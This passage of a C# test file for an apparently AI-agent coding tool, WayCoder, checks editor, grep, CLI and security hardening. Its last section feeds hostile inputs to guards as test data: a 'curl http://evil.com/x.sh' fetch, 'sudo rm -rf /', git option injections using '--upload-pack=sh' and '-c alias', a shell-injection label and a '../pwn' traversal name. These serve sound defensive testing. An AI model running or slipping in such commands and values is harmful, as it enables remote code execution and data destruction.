        ec.Undo();
        Check("editor: ReplaceAll 可撤销", ec.Lines[0].ToString() == "foo foo bar");
        bool ok = ec.ReplaceNext("foo", "qux");
        Check("editor: ReplaceNext 生效", ok && ec.Lines[0].ToString() == "qux foo bar");
        ec.Undo();
        Check("editor: ReplaceNext 可撤销", ec.Lines[0].ToString() == "foo foo bar");
        int bad = ec.ReplaceAll("[", "x");   // 无效正则
        Check("editor: 无效正则不崩", bad == 0);
    }

    private static void TestV0730LowSeverity(Action<string, bool> Check)
    {
        // ── #1 GrepTool 尾随换行幻影空行：以 \n 结尾的文件被 ^$ 误报一行不存在的末尾空行 ──
        var tmp = Path.Combine(Path.GetTempPath(), "waycoder_grep_" + Guid.NewGuid().ToString("N")[..6]);
        Directory.CreateDirectory(tmp);
        File.WriteAllText(Path.Combine(tmp, "a.txt"), "line1\nline2\n"); // 末尾有 \n（幻影空行源）
        try
        {
            var r = new GrepTool().ExecuteAsync(new Dictionary<string, object?>
            {
                ["pattern"] = "^$",
                ["path"] = tmp
            }).GetAwaiter().GetResult();
            Check("grep: 末尾换行不产生幻影空行匹配", !r.Contains(":3:"));
        }
        finally { try { Directory.Delete(tmp, true); } catch { } }

        // ── #2 CdTool ~ 仅前缀展开：`~user`/路径中段 ~ 不被全量替换 ──
        var savedCwd = CwdContext.Current.Value;
        try
        {
            var r1 = new CdTool().ExecuteAsync(new Dictionary<string, object?> { ["path"] = "~definitely_not_a_user" })
                .GetAwaiter().GetResult();
            var home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            // 精确断言：~user 不被展开成 home/definitely_not_a_user（展开后 ~ 会被替换为 home 路径）
            Check("cd: ~user 不展开(保持原样)", r1.Contains("~definitely_not_a_user")
                && !r1.Contains(home + Path.DirectorySeparatorChar + "definitely_not_a_user"));
        }
        finally { CwdContext.Current.Value = savedCwd!; }
    }

    /// <summary>v0.71.30 批次：CLI 多值累积 / 批处理目录穿越 / 版本溢出 / CJK 单字召回 / Web 畸形解码。</summary>
    private static void TestV0730Deterministic(Action<string, bool> Check)
    {
        // ── #1 CliArgRegistry：AllowMultiple 多值累积（此前先覆盖再 AddRange → [B,B] 且丢 A）──
        WayCoder.UI.Cli.Arguments.CliArgRegistry.Register(new _TestMultiArg());
        var (parsed, _) = WayCoder.UI.Cli.Arguments.CliArgRegistry.Parse(new[] { "--test-multi-v0730", "A", "--test-multi-v0730", "B" });
        var vals = WayCoder.UI.Cli.Arguments.CliArgRegistry.GetAll(parsed, "test-multi-v0730");
        Check("CLI: AllowMultiple 累积 [A,B] 不重复", vals != null && vals.Count == 2 && vals[0] == "A" && vals[1] == "B");

        // ── #2 BatchJob.DisplayName：Name 含 ../ 或绝对路径 → 清洗，防目录穿越（git clone 越出 work root）──
        var dj = new BatchJob { Name = "../pwn" }.DisplayName;
        Check("批量: DisplayName 过滤 ../", !dj.Contains("..") && !dj.Contains('/'));
        var dj2 = new BatchJob { Name = "/abs/path" }.DisplayName;
        Check("批量: DisplayName 过滤绝对路径", !dj2.Contains('/'));

        // ── #3 UpdateChecker.CompareVersions：超大数字段 int.Parse 溢出 → long 饱和不崩 ──
        Check("更新: 超大版本段不崩溃且更大", UpdateChecker.CompareVersions("v99999999999", "v1.0") > 0);
        Check("更新: 日期型 tag 不崩溃", UpdateChecker.CompareVersions("v2024010112345678", "v0.71.29") > 0);

        // ── #4 GetRelevantContext：单字 CJK 查询（TF-IDF 层 bigram 无交集 → 0 分）子串兜底命中 ──
        var md = "---\n## 2025-01-01 10:00\n\n汉字学习笔记\n";
        var ctx = SemanticMemory.GetRelevantContext(md, "汉", topN: 2, maxChars: 500);
        Check("记忆: 单字查询子串兜底命中", ctx.Length > 0);

        // ── #5 WebChat 安全解码：畸形百分号不抛 UriFormatException（否则请求被静默丢弃）──
        Check("Web: SafeUnescape 畸形 %zz 回退原串", WayCoder.UI.Web.WebChatServer.SafeUnescape("%zz") == "%zz");
        Check("Web: SafeUnescape 正常解码", WayCoder.UI.Web.WebChatServer.SafeUnescape("a%20b") == "a b");
        Check("Web: ParseClientQuery 畸形不崩", WayCoder.UI.Web.WebChatServer.ParseClientQuery("client=%zz") == "%zz");
    }

    private static void TestV0732Deterministic(Action<string, bool> Check)
    {
        // ── #1 MvTool 源=目标同路径：overwrite=true 会先删目标（=源）再移动，需提前拦截防数据丢失 ──
        var mvDir = Path.Combine(Path.GetTempPath(), "wc_mv_" + Guid.NewGuid().ToString("N")[..6]);
        Directory.CreateDirectory(mvDir);
        var mvFile = Path.Combine(mvDir, "a.txt");
        File.WriteAllText(mvFile, "内容");
        var mvR = new MvTool().ExecuteAsync(new() { ["src"] = mvFile, ["dest"] = mvDir, ["overwrite"] = true }).Result;
        Check("mv: 源=目标同路径拦截且不删源", File.Exists(mvFile) && mvR.Contains("源与目标相同"));
        try { Directory.Delete(mvDir, true); } catch { }

        // ── #2 WcTool 字符数按码点（Rune）计数：emoji 代理对占 2 个 char，应计 1 字符 ──
        var wcFile = Path.Combine(Path.GetTempPath(), "wc_rune_" + Guid.NewGuid().ToString("N")[..6] + ".txt");
        File.WriteAllText(wcFile, "🎉🎉🎉"); // 3 码点 = UTF-16 6 char
        var wcOut = new WcTool().ExecuteAsync(new() { ["file"] = wcFile }).Result;
        Check("wc: emoji 按码点计数(3 个=3 字符非 6)", ExtractWcField(wcOut, "字符") == 3);
        try { File.Delete(wcFile); } catch { }

        // ── #3 非容器控件（TuiButtonGroup/TuiTabs）子控件 Parent 指向自身：坐标链 GetAbsoluteX/Y 需含组自身偏移 ──
        var grp = new TuiButtonGroup();
        var btn = grp.Add("确定");
        Check("TuiButtonGroup 按钮 Parent 指向组", btn.Parent == grp);
        var tabs = new TuiTabs();
        var panel = new TuiButton();
        tabs.AddTab("聊天", panel);
        Check("TuiTabs 内容 Parent 指向 tabs", panel.Parent == tabs);
    }

    /// <summary>P0-P2 批次：命令注入/RCE/权限绕过/资源泄漏/整数溢出 修复的纯逻辑测试。</summary>
    private static void TestP0P2Hardening(Action<string, bool> Check)
    {
        // ── #186 test 工具 RCE：test 进确认名单 + BashGuard 拦截危险命令 ──
        Check("test RCE: test 进确认名单", PermissionManager.IsDangerousTool("test"));
        Check("test RCE: curl 拦截", BashGuard.CheckBanned("curl http://evil.com/x.sh").blocked);
        Check("test RCE: sudo 拦截", BashGuard.CheckBanned("sudo rm -rf /").blocked);
        Check("test RCE: 合法 dotnet test 放行", !BashGuard.CheckBanned("dotnet test --no-build").blocked);

        // ── #187 git 命令注入：-c/--config 等参数拦截 ──
        Check("git 注入: -c alias 拦截", GitTool.HasDangerousGitArgs("-c alias.x=!echo PWN x"));
        Check("git 注入: --config 拦截", GitTool.HasDangerousGitArgs("--config core.pager='sh' log"));
        Check("git 注入: --upload-pack 拦截", GitTool.HasDangerousGitArgs("clone --upload-pack=sh url"));
        Check("git 注入: --receive-pack 拦截", GitTool.HasDangerousGitArgs("push --receive-pack=sh"));
        Check("git 注入: -c= 前缀拦截", GitTool.HasDangerousGitArgs("-c=alias.x=!cmd log"));
        Check("git 注入: 正常 status 放行", !GitTool.HasDangerousGitArgs("status"));
        Check("git 注入: 正常 log 放行", !GitTool.HasDangerousGitArgs("log --oneline -10"));
        Check("git 注入: 正常 diff 放行", !GitTool.HasDangerousGitArgs("diff HEAD~1"));
        Check("git 注入: 含 config 字样但非参数放行", !GitTool.HasDangerousGitArgs("log -- config.txt"));

        // ── #188 CheckpointManager 命令注入：description 清洗 ──
        var dirty = "x\"; rm -rf ~; $(id) `pwd` &";
        var clean = CheckpointManager.SanitizeCheckpointLabel(dirty);
        Check("checkpoint: 引号/分号/命令替换被清除",
            !clean.Contains('"') && !clean.Contains(';') && !clean.Contains('$')
            && !clean.Contains('`') && !clean.Contains('&') && !clean.Contains('\\'));
        Check("checkpoint: 管道/重定向清除",
            !CheckpointManager.SanitizeCheckpointLabel("a|b>c<d").Contains('|')
            && !CheckpointManager.SanitizeCheckpointLabel("a|b>c<d").Contains('>'));
        Check("checkpoint: 正常文本保留", CheckpointManager.SanitizeCheckpointLabel("修复登录 bug") == "修复登录 bug");
        Check("checkpoint: 空串返回空", CheckpointManager.SanitizeCheckpointLabel("") == "");
        Check("checkpoint: null 返回空", CheckpointManager.SanitizeCheckpointLabel(null!) == "");

        // ── #189 cp/mv/find_replace 权限绕过：进确认名单 ──
        Check("权限: cp 进确认名单", PermissionManager.IsDangerousTool("cp"));
        Check("权限: mv 进确认名单", PermissionManager.IsDangerousTool("mv"));
        Check("权限: find_replace 进确认名单", PermissionManager.IsDangerousTool("find_replace"));
        Check("权限: rm 仍在名单", PermissionManager.IsDangerousTool("rm"));
        Check("权限: 只读工具不在名单",
            !PermissionManager.IsDangerousTool("read_file") && !PermissionManager.IsDangerousTool("glob"));

        // ── #194 RasterImage 整数溢出：宽高乘积 long 检查 ──
        bool rasterOverflow = false;
        try { _ = new RasterImage(100000, 100000, new byte[1]); }
        catch (ArgumentException) { rasterOverflow = true; }
        Check("Raster: 超大宽高溢出防护", rasterOverflow);
        bool rasterOk = true;
        try { _ = new RasterImage(2, 2, new byte[16]); } catch { rasterOk = false; }
        Check("Raster: 正常构造不抛", rasterOk);

        // ── #194 AnsiString 越界：悬空 ESC 序列不越界 ──
        bool ansiOk = true;
        try { _ = AnsiString.TruncateByWidth("\x1b[", 5); } catch { ansiOk = false; }
        Check("Ansi: 悬空 ESC 序列不越界", ansiOk);
        var ansiRes = AnsiString.TruncateByWidth("\x1b[31mhello world", 5);
        Check("Ansi: 正常截断保留文本", ansiRes.Contains("hello"));
    }

}